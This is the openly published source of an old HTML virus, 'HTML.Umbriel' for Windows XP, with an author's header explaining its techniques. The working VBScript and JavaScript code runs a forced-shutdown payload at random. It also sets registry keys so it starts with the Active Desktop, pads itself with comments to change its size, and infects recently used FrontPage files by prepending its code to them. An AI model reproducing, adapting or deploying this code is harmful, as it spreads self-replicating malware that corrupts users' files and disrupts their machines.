  HTML.Umbriel for WindowsXP
  by Second Part To Hell[rRlf]
  www.spth.de.vu
  spth@aonmail.at
  written from 25.04.2003 to 28.04.2003
  in Austria

  You may think: "Another lame HTML-virus"... You aren't right ;)
  The virus shows 4 technique I found while discovering some nice things at WinXP:

  Technique 1: It's a lame non-destructiv payload for DOS XP (CMD.exe) It shutdowns the computer with a 300sec countdown.
               It's will fuckin' hard to stop the countdown, if you don't know, how it works.

  Technique 2: You are able to add a HTML-file to the WinXP desktop. Windows saves the path of that file in the registry.
               Because of the fact, that the desktop is started every windows-start, also the HTML-file runs every 
               Windows-Start. That mean, that's a new start-up technique for WinXP. You just have to make a HTML file
               running the virus and make two reg-keys like this HTML file.

  Technique 3: That's a really (!!!) lame polymorphism. You will find it in the JavaScript-part in the middle of the virus.
               I think, I don't have to say anything more about it.

  Technique 4: What a HTML-virus does? Searching files in (the current and maybe in the temp) directories.
               OK, but I don't think, that this is the most successful way of finding files. How to do that better?
               With registry. I found out, that FrontPage saves the files generated with it in the registry.
               So you have to copy the value of the key and... you have the file! Maybe you will ask, why finding files
               in directories isn't good. The answere is: You won't find files used often by the computer-user. The chance
               to find files from registry, that are often used is much bigger than just any file.

General Infos:
VirusName................. HTML.Umbriel (that's a moon of uranus)
VirusAuthor............... Second Part To Hell[rRlf]
VirusSize................. different - first gen: 3.465 Byte
Infection................. Infects the last 5 files (most are HTM, HTML, HTT, ...) generated with FrontPage
			   Copies the virus-code infront of the real file
Payload................... Yes (one out of five times it starts a shutdown-countdown with 300sec)
Encryption................ No
Autostart................. Yes (includes itself to the desktop :D )
Polymorphism.............. Not really (adds rem [at VBS parts] or /* */ [at JS part], that's just for changing the size)


	I have to thank these two people:
		+ Bumblebee			<-- for your HTML.Lame ;) helped much, but i tried to don't copy anything from it!
		+ Gerry (friend from school)	<-- for helping me with the idea of the desktop thing. Thx!


-------------------------------------------[HTML.Umbriel for WindowsXP]-------------------------------------------
<html><!--Umbriel-->
<head>
<title> Second Part To Hell's HTML.Umbriel </title>
</head>
<body>
<script language="VBScript">
rem VBS
On Error Resume Next
Dim fso, shell, wrte, tempdir, windir, rand, file
Set fso=CreateObject("Scripting.FileSystemObject")
Set shell=CreateObject("Wscript.Shell")
if err.number=429 Then
  shell.Run javascript:location.reload()
End If

Set windir=fso.GetSpecialFolder(0)
Set tempdir=fso.GetSpecialFolder(2)

Set wrte=fso.CreateTextFile(windir+"\windows.cmd")
wrte.WriteLine "cls"
wrte.WriteLine "@echo off"
wrte.WriteLine "shutdown -s -f -t 300 -c "+chr(34)+"Second Part To Hell's Umbriel has you..."+chr(34)
wrte.Close()

shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\Components\1\Source", "C:\umbriel.html"
shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\Components\1\SubscribedURL", "C:\umbriel.html"

Randomize
rand=int(rnd*5)+1
If rand=1 then
  shell.Run windir+"\windows.cmd"
End If
</script>

<script language="JavaScript">
// JS
var viruspath, virus, code, fso, file, check, checka, checkb
fso=new ActiveXObject("Scripting.FileSystemObject")
viruspath=window.location.pathname
viruspath=viruspath.slice(1)
virus=fso.OpenTextFile(viruspath,1)
file=fso.CreateTextFile("C:\\umbriel.html")
for (i=0; i<500; i++)
{
  if (checkb!=1)
  {
    if (Math.round(Math.random()*5)+1 == 3) 
    {
      if (check == 2)
      {
        file.WriteLine("/"+"*")
        file.WriteLine("*"+"/")
      }
      if (check == 3)
      {
        file.WriteLine("rem")
      }
    }
    code=virus.ReadLine()
    if (code == "/"+"*") { checka=666 }
    if (code == "*"+"/") { checka=666 }
    if (code == "rem") { checka=666 }
    if (checka != 666 ) { file.WriteLine(code) }
    checka=0
    if (code=="</"+unescape("%68")+"tml>") { checkb=1 }
    if (code=="// JS") { check=2 }
    if (code=="rem VBS") { check=3 }
    if (code=="</"+unescape("%73")+"cript>") { check=0 }
  }
}
virus.Close();
file.Close();
</script>

<script language="VBScript">
rem VBS
On Error Resume Next
set fso=CreateObject("Scripting.FileSystemObject")
set shell=CreateObject("WScript.Shell")
set myfile=fso.OpenTextFile("C:\umbriel.html")
mycode=myfile.ReadAll
myfile.Close()
rr=shell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File1")
if rr <> "" Then Call Umbriel(rr, mycode)
rr=shell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File2")
if rr <> "" Then Call Umbriel(rr, mycode)
rr=shell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File3")
if rr <> "" Then Call Umbriel(rr, mycode)
rr=shell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File4")
if rr <> "" Then Call Umbriel(rr, mycode)
rr=shell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File5")
if rr <> "" Then Call Umbriel(rr, mycode)

Sub Umbriel(rr, mycode)
set victim=fso.OpenTextFile(rr)
infcheck=victim.ReadLine
If infcheck<>"<html><!--Umbriel-->" Then
  viccode=victim.ReadAll
  victim.Close()
  set wrtevic=fso.OpenTextFile(rr, 2, false, 0)
  wrtevic.Write (mycode+infcheck+chr(13)+chr(10)+viccode)
  wrtevic.Close
End If

End Sub
</script>
</body>
</html>